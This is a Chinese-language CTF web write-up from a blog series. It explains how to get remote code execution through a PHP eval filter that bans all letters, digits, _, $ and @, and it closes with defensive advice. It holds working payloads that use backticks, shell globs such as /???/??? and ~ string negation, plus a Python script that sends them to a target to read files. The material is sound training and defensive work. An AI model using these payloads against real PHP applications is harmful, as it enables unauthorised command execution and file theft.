---
title: "CTF Web 基础三题（三）—— PHP 无字母数字 RCE"
date: "2026-10-23"
tags: ["Security", "CTF", "Web"]
excerpt: "字母、数字、_、$、@ 全被禁，反引号里的内容又是字面量。最后用 ?> 退出 PHP，再靠 <?= 和 glob 把命令拼出来。"
series: "ctf-web-basics"
seriesOrder: 3
---

> 题目环境：PHP 5.6.40，`?code=` 直接 `eval`，过滤 `/[A-Za-z0-9_$@]+/`。
> 最终 flag：`ctfhub{9f0cce579557dcd22b4816c6}`

## 一、一句话考点

**字母、数字、`_`、`$`、`@` 全被禁，等于没有变量也没有函数名；只剩符号时，唯一能执行的是反引号 + shell 的 glob。**

## 二、源码

```
/?            → highlight_file(__FILE__)

<?php
error_reporting(0);
if(!isset($_GET['code'])){
    highlight_file(__file__);
}else{
    $code = $_GET['code'];
    if(preg_match("/[A-Za-z0-9_$@]+/", $code)){
        die('fighting!');
    }
    eval($code);
}
```

注意 `preg_match` 没有锚点：**只要出现一个**字母/数字/`_`/`$`/`@`，就 `die`。所以 payload 必须是**纯符号**。

## 三、先算「还剩什么」

允许的字符：

```
? > < = ` ~ " ' ( ) [ ] { } / \ | & ; : , . + - * % ^ ! # 空格 换行
```

被禁的其实只有 5 类：`A-Z a-z 0-9 _ $ @`。

于是两个直接后果：

- **没有 `$`** → 不能定义/使用变量，`$_GET`、`$f()` 全部不可用
- **没有字母** → 不能写函数名、关键字（`eval`、`include`、`system` 都写不出来）

## 四、三个候选原语，逐个判死刑

### `(表达式)()`

PHP 7 的「统一变量语法」允许把表达式当函数调用：

```php
(~"\x8f\x97\x8f\x96\x91\x99\x90")();   // phpinfo()，PHP 7 才行
```

**但服务器是 PHP 5.6.40，这是 parse error**，响应直接是空的。这一条要记住：**动态调用是版本特性**。

### `~` 取反构造字符串

`~` 对字符串按字节取反，可以把高位字节还原成 ASCII：

```
~"\x8f\x97\x8f\x96\x91\x99\x90"  →  "phpinfo"
```

构造方法：

```python
def notstr(s):
    return '~"' + ''.join(chr(0xFF ^ ord(c)) for c in s) + '"'
```

**`~` 本身没问题**，问题在「构造出字符串以后怎么调用」。

### 反引号

`` `命令` `` 等价于 `shell_exec()`。看起来是唯一能执行的原语。

但它有个致命细节：**反引号里的内容是字面量（和双引号字符串一样），不是表达式**。

```php
`~"id"`      // 实际执行命令：~"id"   ← 不是 id！
```

因为 `$` 被禁，也没法用 `` `$cmd` `` 插值。所以反引号只能跑**字面上的命令**——而命令里的字母又被禁了。

**结论：字母写不出来，但 shell 的 glob 可以代替字母。**

## 五、真正的解法：反引号 + glob

shell 的 `?` 匹配任意一个字符：

```
/???/???   →  /bin/cat
/???/??    →  /bin/cp /bin/dd /bin/df ...（有歧义，排序后第一个是 cp）
```

`?` `/` `*` 都不在 PHP 的黑名单里。

同时还需要一个**输出通道**。`eval` 里可以 `?>` 退出 PHP 模式，再用 `<?=`（短 echo 标签，永远可用）把表达式的值打出来：

```php
?><?=`命令`;?>
```

## 六、拼出完整 payload

目标：读根目录下名字里带 flag 的文件，但不知道文件名。

思路：用 `cat` + 一堆 `?` 长度的 glob，把所有可能的根目录文件名一次性全给它：

```
?><?=`/???/??? /???? /????? /?????? /??????? ... /?????????????????`;?>
```

- `/???/???` → `/bin/cat`（3 字母目录 + 3 字母文件，排序后 `cat` 在 `cut/dir/sed/tar` 前面）
- 后面 13 个 glob 覆盖根目录下 4~16 字符的条目
- `cat` 会把命中的普通文件内容全部打印出来

响应会非常大（因为 glob 展开把 `/bin/cut`、`/bin/dir` 这些也当参数传给了 cat，一共 1.6MB），**但 flag 会追加在末尾**。

最终在响应尾部拿到：

```
ctfhub{9f0cce579557dcd22b4816c6}
```

## 七、三个必须记住的坑

### 编码：`quote` 会按 UTF-8 编码高位字节

```python
urllib.parse.quote(code)                      # 0xB7 → %C2%B7（两字节！）
urllib.parse.quote_from_bytes(code.encode('latin-1'), safe='')   # 0xB7 → %B7 ✓
```

踩坑现场：想输出 `HELLO`，结果页面是 `=H=E=L=L=O`。因为 `0xC2` 取反是 `=`，`0xB7` 取反是 `H`——**每个字符被拆成了两字节**。

看到「输出每个字符前面多一个固定符号」，第一反应就应该是编码问题。

### 空格 vs 换行

- 空格：shell 的**参数分隔符** ✓ 可用（空格不在黑名单）
- 换行：shell 的**命令分隔符** ✗

```sh
/???/??? /????          # cat 的参数是 /????  ✓
/???/???\n/????         # 两条命令：cat ... 然后执行 /boot ✗
```

### 别一个个长度试

一开始我写了个脚本，从 4 到 16 每个长度单独请求一次（每次 10 秒 + 1.6MB），跑了 5 分钟没结果。

正确做法：**一次请求把所有长度拼进去**，反正 cat 会全读。

## 八、完整脚本

```python
import urllib.parse, urllib.request

BASE = 'http://target/'
UA = 'Mozilla/5.0 ... Firefox/128.0'

def send(code):
    url = BASE + '?code=' + urllib.parse.quote_from_bytes(code.encode('latin-1'), safe='')
    return urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': UA}), timeout=90).read()

args = ' '.join('/' + '?' * n for n in range(4, 17))
raw = send('?><?=`/???/??? ' + args + '`;?>')
print(raw.decode('latin-1')[-400:])
```

## 九、防御

```php
// 1. 永远不要 eval 用户输入
// 2. 如果一定要做「代码执行」类功能，用白名单而不是黑名单
if (!preg_match('/^[a-z0-9_]+$/i', $code)) { die('bad'); }   // 白名单

// 3. disable_functions 至少加：
// shell_exec,exec,system,passthru,popen,proc_open,pcntl_exec
```

注意：**黑名单永远漏**。这题禁了字母数字，但还是输在「没禁反引号和 glob」。

## 十、迁移：无字母数字题的通用套路

| 环境 | 可用原语 | 关键点 |
|---|---|---|
| PHP 7+ | `(表达式)()` + `~` 构造函数名 | 动态调用 |
| PHP 5.x | 反引号 + glob | 反引号是字面量 |
| 有 `$` 但禁字母 | `$_GET` 传参 + `assert`/`eval` | 变量还在 |
| 全禁 + 有 shell | glob 拼命令、`${IFS}` 拼空格 | 见 Ruby 那篇 |

**通用思维**：先列可用字符集，再问「每个符号在语言里是什么语义」，最后找一条「符号 → 执行」的路径。这题不是绕过过滤，是用剩下的符号重新写代码。
